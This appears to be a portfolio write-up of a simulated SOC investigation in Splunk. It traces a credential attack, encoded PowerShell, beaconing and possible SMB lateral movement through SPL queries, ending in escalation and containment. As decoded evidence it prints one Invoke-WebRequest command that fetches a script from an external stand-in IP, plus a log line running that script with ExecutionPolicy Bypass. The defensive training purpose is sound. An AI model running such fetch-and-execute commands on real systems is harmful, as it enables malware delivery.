# Splunk SIEM Investigation

## Project Overview

This project demonstrates a simulated Tier-1 SOC investigation using Splunk-style security logs and SPL queries. The investigation began with an alert involving multiple failed authentication attempts followed by a successful login. I analyzed authentication, process, file, and network activity to determine the scope of the incident.

The investigation identified suspicious PowerShell activity, communication with an external IP associated with malicious activity, possible automated beaconing, and evidence consistent with possible lateral movement across multiple endpoints. The incident was ultimately escalated based on the correlation of authentication, endpoint, and network evidence.

## Scenario

As a Tier-1 SOC analyst, I received a medium-severity alert indicating multiple failed authentication attempts followed by a successful login to the same user account. My objective was to investigate the authentication activity, determine whether the successful login represented a potential account compromise, identify any related activity, determine the scope of the incident, and decide whether escalation was necessary.

### Initial Alert

```text
Alert: Multiple Failed Logins Followed by Successful Authentication
Severity: Medium
Time: 02:14:37
Source IP: 203.0.113.77
Destination Host: FIN-WS-04
User: jmartinez
Failed Authentication Attempts: 12
Successful Authentication: 1
Time Window: 3 minutes
```

## Investigation Step 1 — Authentication Analysis

I began by investigating the source IP `203.0.113.77` to determine whether the authentication activity was isolated to `jmartinez` or involved additional user accounts.

### SPL Query

```spl
index=security src_ip="203.0.113.77" earliest=-24h latest=now
```

### Findings

The search identified failed authentication attempts against multiple user accounts, including `asmith`, `rchen`, and `jmartinez`. The activity originated from the same source IP and eventually resulted in a successful authentication to the `jmartinez` account.

Because the same source IP attempted authentication against multiple accounts before successfully accessing one account, I considered the activity suspicious and potentially consistent with a credential-based attack. However, the authentication events alone were not sufficient to confirm that the account had been compromised.

## Investigation Step 2 — Post-Authentication Activity

After identifying the successful authentication to `jmartinez`, I investigated activity associated with the account to determine whether suspicious actions occurred on `FIN-WS-04` after the login.

### SPL Query

```spl
index=security user="jmartinez"
| table _time user host event_type process command dst_ip dst_port
| sort _time
```

### Findings

Shortly after the successful authentication, `powershell.exe` was launched on `FIN-WS-04`. A subsequent PowerShell event contained an encoded command. The endpoint then established an outbound connection to `198.51.100.44` over port 443, followed by the creation of `C:\Users\Public\update.ps1`.

At this stage, I considered the activity highly suspicious, but the network connection and file creation alone did not prove that the external connection was responsible for downloading the script. I continued investigating the PowerShell command to determine its purpose.

### PowerShell Analysis

Further analysis of the encoded PowerShell command revealed:

```powershell
Invoke-WebRequest -Uri https://198.51.100.44/update.ps1 -OutFile C:\Users\Public\update.ps1
```

This provided direct evidence that PowerShell retrieved `update.ps1` from `198.51.100.44` and saved it to `C:\Users\Public\update.ps1`.

Threat-intelligence information in the simulated investigation also indicated that the external IP had previously been associated with malicious activity. This increased the level of concern but did not independently prove that this specific connection was malicious.

## Investigation Step 3 — Script Execution & Possible Beaconing

After confirming that PowerShell downloaded `update.ps1` from `198.51.100.44`, I investigated subsequent endpoint and network activity to determine whether the script was executed and whether additional suspicious behavior occurred.

### Endpoint Evidence

```text
02:17:02  FILE_CREATE
          C:\Users\Public\update.ps1

02:17:11  PROCESS_START
          powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\update.ps1

02:17:18  NETWORK_CONNECT
          dst_ip=198.51.100.44 dst_port=443

02:18:18  NETWORK_CONNECT
          dst_ip=198.51.100.44 dst_port=443

02:19:18  NETWORK_CONNECT
          dst_ip=198.51.100.44 dst_port=443

02:20:18  NETWORK_CONNECT
          dst_ip=198.51.100.44 dst_port=443
```

### Findings

The downloaded `update.ps1` script was executed through PowerShell using `ExecutionPolicy Bypass`. Seven seconds after execution, `FIN-WS-04` established an outbound connection to `198.51.100.44` over TCP port 443.

Additional connections to the same destination occurred at exactly 60-second intervals. The regular timing suggested automated network activity and was consistent with **possible beaconing**. However, the timing pattern alone was not sufficient to confirm command-and-control (C2) communication.

When correlated with the suspicious authentication activity, encoded PowerShell, external script retrieval, execution-policy bypass, and the external IP's threat-intelligence history, the recurring network activity significantly increased the severity of the incident.

## Investigation Step 4 — Escalation & Initial Containment

Based on the evidence collected, I determined that the alert warranted escalation to Tier 2/Incident Response. The investigation had progressed beyond an isolated authentication anomaly and showed multiple correlated indicators of potentially malicious activity.

### Escalation Rationale

The source IP `203.0.113.77` generated failed authentication attempts against multiple user accounts before successfully authenticating as `jmartinez`.

Following the successful login, encoded PowerShell activity occurred on `FIN-WS-04`, `update.ps1` was retrieved from `198.51.100.44`, and the script was executed using `ExecutionPolicy Bypass`.

The endpoint subsequently established outbound connections to the same external IP at consistent 60-second intervals. Combined with the threat-intelligence information associated with the destination IP, these findings warranted escalation for further investigation and response.

### Recommended Initial Containment

I recommended temporarily disabling the `jmartinez` account and revoking active sessions to prevent potential continued unauthorized account access.

I also recommended isolating `FIN-WS-04` from the network while preserving the endpoint for further investigation.

Communication with `198.51.100.44` should also be blocked according to the organization's incident-response procedures to disrupt additional connections to the suspicious destination.

## Investigation Step 5 — Scope Expansion & Additional Endpoints

After escalating the incident, I expanded the investigation to determine whether other internal endpoints were communicating with `198.51.100.44`.

### SPL Query

```spl
index=security dst_ip="198.51.100.44"
| stats count by src_ip host
| sort - count
```

### Findings

The search identified four internal endpoints communicating with the same external IP:

```text
src_ip       host         count
10.0.0.50    FIN-WS-04       4
10.0.0.51    FIN-WS-08       4
10.0.0.52    HR-WS-03        4
10.0.0.53    ENG-WS-11       4
```

In addition to `FIN-WS-04`, three additional endpoints had communicated with `198.51.100.44`. Each endpoint generated four connections to the same destination.

I then reviewed the raw network events to compare their timing.

### Timeline Query

```spl
index=security dst_ip="198.51.100.44"
| table _time src_ip host dst_ip dst_port
| sort _time
```

Each endpoint communicated with `198.51.100.44` over port 443 at consistent 60-second intervals. The activity appeared sequentially across the four endpoints, with one system's recurring connections ending before similar activity appeared on another.

This expanded the potential scope of the incident beyond `FIN-WS-04`. The consistent timing and shared destination increased suspicion of coordinated or automated activity across multiple systems, but did not by itself establish that the additional endpoints were compromised or explain how the activity reached them.

## Investigation Step 6 — SMB Analysis & Possible Lateral Movement

After identifying similar external communication across multiple endpoints, I investigated whether `FIN-WS-04` had communicated with the additional systems over SMB, a protocol that can be used legitimately for Windows resource sharing but can also be abused during lateral movement.

### SPL Query

```spl
index=security src_ip="10.0.0.50" dst_port=445
| stats count by dst_ip host
```

### Findings

```text
dst_ip       host         count
10.0.0.51    FIN-WS-08       3
10.0.0.52    HR-WS-03        3
10.0.0.53    ENG-WS-11       3
```

`FIN-WS-04` communicated with all three additional endpoints over SMB port 445.

Because SMB traffic can be legitimate, this alone was not sufficient to conclude that lateral movement had occurred. I examined the raw events to establish the timing of the SMB activity.

### Timeline Query

```spl
index=security src_ip="10.0.0.50" dst_port=445
| table _time src_ip dst_ip host dst_port
| sort _time
```

The SMB activity from `FIN-WS-04` occurred shortly before each additional endpoint began communicating with `198.51.100.44`.

I then examined endpoint telemetry from those systems to determine whether they exhibited behavior similar to `FIN-WS-04`.

### Additional Endpoint Query

```spl
index=security host IN ("FIN-WS-08", "HR-WS-03", "ENG-WS-11")
| table _time host event_type process command path
| sort _time
```

### Endpoint Findings

Each of the three additional endpoints created `C:\Users\Public\update.ps1` shortly after the SMB activity.

Each system then executed the script through PowerShell using `ExecutionPolicy Bypass` before beginning the previously identified recurring connections to `198.51.100.44`.

The correlation between SMB communication from `FIN-WS-04`, creation and execution of the same script on the additional endpoints, and subsequent 60-second outbound communication to the same external IP provided substantially stronger evidence consistent with **possible lateral movement**.

The available telemetry still did not establish exactly what occurred within the SMB sessions or prove that SMB itself transferred the script. Therefore, I would escalate the additional endpoints for deeper investigation rather than state that SMB-based lateral movement was definitively confirmed.

## Final Analyst Assessment

The investigation began with multiple failed authentication attempts against several user accounts from `203.0.113.77`, followed by a successful authentication to the `jmartinez` account on `FIN-WS-04`.

Following the successful login, encoded PowerShell activity was observed and further analysis revealed that PowerShell retrieved `update.ps1` from `198.51.100.44`, an external IP previously associated with malicious activity in the simulated threat-intelligence data.

The downloaded script was executed using `ExecutionPolicy Bypass`, followed by outbound connections to `198.51.100.44` at consistent 60-second intervals. Further investigation identified three additional endpoints exhibiting the same script execution and recurring external communication. Each additional endpoint also received SMB traffic from `FIN-WS-04` shortly before the suspicious activity appeared.

The correlation of authentication, process, file, SMB, network, and threat-intelligence evidence is consistent with a potential credential-based compromise followed by possible lateral movement and automated beaconing across four endpoints.

Because the available evidence does not establish the exact authentication technique, contents of the SMB sessions, or whether the recurring traffic represents confirmed command-and-control activity, those conclusions would require additional investigation.

I would escalate the incident to Tier 2/Incident Response, isolate the affected or potentially affected endpoints, temporarily disable the potentially compromised account and revoke its active sessions, and block communication with `198.51.100.44` according to organizational procedures.

Further investigation should analyze `update.ps1`, determine the complete scope of affected systems and accounts, and preserve relevant evidence for incident response.

## Skills Demonstrated

- Tier-1 SOC alert triage and investigation
- SPL searching, filtering, `stats`, `table`, `sort`, and multi-value host searches
- Authentication log analysis and account-compromise investigation
- PowerShell and endpoint activity analysis
- Network traffic and recurring-connection analysis
- Threat-intelligence correlation
- SMB activity analysis and lateral-movement investigation
- Event timeline construction and cross-source correlation
- Incident scoping across multiple endpoints
- Differentiating suspicious activity from confirmed malicious activity
- Escalation and containment decision-making
- Evidence-based incident documentation

## Disclaimer

This project is an educational simulation designed to demonstrate Tier-1 SOC investigation methodology, security-event analysis, and SPL fundamentals.

The logs, alerts, IP addresses, usernames, hosts, threat-intelligence information, and incident scenario are simulated and do not represent a real production security incident.